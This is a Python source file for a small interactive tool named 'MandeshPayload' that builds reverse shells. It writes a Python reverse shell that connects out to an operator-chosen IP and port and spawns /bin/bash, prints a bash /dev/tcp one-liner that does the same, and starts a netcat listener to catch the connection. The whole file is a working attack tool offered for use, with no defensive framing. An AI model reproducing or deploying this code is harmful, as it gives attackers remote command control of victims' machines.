import os
from colorama import Fore, Style

class MandeshPayload:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def generate_python_payload(self):
        # A classic, encoded reverse shell payload
        payload = f"""
import socket,os,pty
s=socket.socket(socket.socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{self.ip}",{self.port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
"""
        with open("payload.py", "w") as f:
            f.write(payload)
        print(f"{Fore.GREEN}[+] Python payload generated: payload.py{Style.RESET_ALL}")

    def generate_bash_one_liner(self):
        # High-efficiency one-liner for quick execution
        cmd = f"bash -i >& /dev/tcp/{self.ip}/{self.port} 0>&1"
        print(f"{Fore.CYAN}[+] Bash One-Liner:{Style.RESET_ALL}")
        print(f"    {cmd}")

    def start_listener(self):
        # Uses the system's netcat (nc) to wait for the connection
        print(f"{Fore.YELLOW}[!] Starting Listener on port {self.port}...{Style.RESET_ALL}")
        os.system(f"nc -lvnp {self.port}")

if __name__ == "__main__":
    l_ip = input("Enter your Listener IP (Local/Ngrok): ")
    l_port = input("Enter your Listener Port: ")
    
    engine = MandeshPayload(l_ip, l_port)
    print("\n[1] Generate Python Payload\n[2] Generate Bash One-Liner\n[3] Start Listener")
    choice = input("\nSelect >> ")

    if choice == "1": engine.generate_python_payload()
    elif choice == "2": engine.generate_bash_one_liner()
    elif choice == "3": engine.start_listener()
